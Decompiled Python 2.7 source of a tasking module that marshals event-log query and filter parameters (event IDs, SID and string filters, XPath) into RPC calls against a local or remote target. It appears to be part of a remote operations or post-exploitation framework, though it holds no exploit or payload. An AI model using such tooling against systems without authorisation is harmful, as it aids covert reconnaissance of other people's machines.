# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_EventLogQuery_Tasking.py


def TaskingMain(namespace):
    import mcl.tasking
    procedure = mcl.tasking.GetProcedureNumber()
    if procedure == 0:
        return _handleEventLogQuery(namespace)
    else:
        if procedure == 1:
            return _handleEventLogFilter(namespace)
        import mcl.tasking
        mcl.tasking.EchoError('Unknown procedure (%u)' % procedure)
        return False


def _handleEventLogFilter(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.eventlogquery', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.eventlogquery.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.security.cmd.eventlogquery.FilterParams()
    tgtParams.eventId = lpParams['id']
    tgtParams.startRecord = lpParams['startrecord']
    tgtParams.numToParse = lpParams['num']
    tgtParams.maxReturned = lpParams['max']
    if lpParams['remote'] != None:
        tgtParams.target = lpParams['remote']
    if lpParams['log'] != None:
        tgtParams.log = lpParams['log']
    if lpParams['sidFilter'] != None:
        tgtParams.sidFilter = lpParams['sidFilter']
    if lpParams['stringFilter'] != None:
        tgtParams.stringFilter = lpParams['stringFilter']
    if lpParams['xpath'] != None:
        tgtParams.xpath = lpParams['xpath']
    if lpParams['classic']:
        tgtParams.flags |= mca.security.cmd.eventlogquery.PARAMS_FLAG_USE_CLASSIC_LOG
    rpc = mca.security.cmd.eventlogquery.tasking.RPC_INFO_FILTER
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    taskXml = mcl.tasking.Tasking()
    if len(tgtParams.target) > 0:
        taskXml.SetTargetRemote(tgtParams.target)
    else:
        taskXml.SetTargetLocal()
    taskXml.AddSearchMask(tgtParams.log)
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.eventlogquery.errorStrings)
        return False
    else:
        return True


def _handleEventLogQuery(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.eventlogquery', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.security.cmd.eventlogquery.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.security.cmd.eventlogquery.QueryParams()
    tgtParams.startNum = lpParams['startnum']
    if lpParams['endnum'] != 0:
        tgtParams.endNum = lpParams['endnum']
    else:
        tgtParams.endNum = tgtParams.startNum
    if lpParams['classic']:
        tgtParams.flags |= mca.security.cmd.eventlogquery.PARAMS_FLAG_USE_CLASSIC_LOG
    if lpParams['remote'] != None:
        tgtParams.target = lpParams['remote']
    if lpParams['log'] == None:
        logName = ''
    else:
        logName = lpParams['log']
    rpc = mca.security.cmd.eventlogquery.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    if len(logName) > 0:
        msg.AddStringUtf8(mca.security.cmd.eventlogquery.MSG_KEY_PARAMS_QUERY_LOG, logName)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    taskXml = mcl.tasking.Tasking()
    if len(tgtParams.target) > 0:
        taskXml.SetTargetRemote(tgtParams.target)
    else:
        taskXml.SetTargetLocal()
    if len(logName) > 0:
        taskXml.AddSearchMask(logName)
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.security.cmd.eventlogquery.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)